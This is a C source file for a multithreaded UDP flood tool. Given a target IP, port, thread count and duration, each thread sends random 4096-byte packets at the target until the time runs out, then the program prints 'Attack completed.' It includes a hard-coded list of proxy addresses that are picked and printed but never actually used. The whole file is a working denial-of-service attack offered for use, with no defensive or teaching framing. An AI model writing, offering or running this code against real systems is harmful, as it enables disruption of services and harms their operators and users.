#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <arpa/inet.h>

#define MAX_PAYLOAD_SIZE 4096
#define MAX_PROXY_COUNT 50
#define PROXY_LENGTH 100

struct thread_data {
    char ip[16];
    int port;
    int time;
};

char proxy_list[MAX_PROXY_COUNT][PROXY_LENGTH] = {
    "192.168.1.1:8080", "192.168.1.2:8080", "192.168.1.3:8080", "192.168.1.4:8080", "192.168.1.5:8080",
    "192.168.1.6:8080", "192.168.1.7:8080", "192.168.1.8:8080", "192.168.1.9:8080", "192.168.1.10:8080",
    "192.168.2.1:8080", "192.168.2.2:8080", "192.168.2.3:8080", "192.168.2.4:8080", "192.168.2.5:8080",
    "192.168.2.6:8080", "192.168.2.7:8080", "192.168.2.8:8080", "192.168.2.9:8080", "192.168.2.10:8080",
    "10.0.0.1:8080", "10.0.0.2:8080", "10.0.0.3:8080", "10.0.0.4:8080", "10.0.0.5:8080",
    "10.0.0.6:8080", "10.0.0.7:8080", "10.0.0.8:8080", "10.0.0.9:8080", "10.0.0.10:8080",
    "172.16.0.1:8080", "172.16.0.2:8080", "172.16.0.3:8080", "172.16.0.4:8080", "172.16.0.5:8080",
    "172.16.0.6:8080", "172.16.0.7:8080", "172.16.0.8:8080", "172.16.0.9:8080", "172.16.0.10:8080",
    "203.0.113.1:8080", "203.0.113.2:8080", "203.0.113.3:8080", "203.0.113.4:8080", "203.0.113.5:8080",
    "203.0.113.6:8080", "203.0.113.7:8080", "203.0.113.8:8080", "203.0.113.9:8080", "203.0.113.10:8080"
};

int proxy_count = MAX_PROXY_COUNT;

char *get_random_proxy() {
    return proxy_list[rand() % proxy_count];
}

void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] = (rand() % 256); // Random byte between 0-255
    }
}

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char payload[MAX_PAYLOAD_SIZE];

    char *proxy = get_random_proxy();
    printf("Using proxy: %s\n", proxy);

    // Configure socket to use proxy if needed (implementation depends on proxy type, e.g., SOCKS5)

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        generate_payload(payload, MAX_PAYLOAD_SIZE);

        if (sendto(sock, payload, MAX_PAYLOAD_SIZE, 0,
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <THREADS> <DURATION>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);

    pthread_t thread_pool[threads];
    struct thread_data t_data;

    strncpy(t_data.ip, ip, sizeof(t_data.ip));
    t_data.port = port;
    t_data.time = duration;

    srand(time(NULL));

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, attack, (void *)&t_data) != 0) {
            perror("Thread creation failed");
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("Attack completed.\n");
    return EXIT_SUCCESS;
}
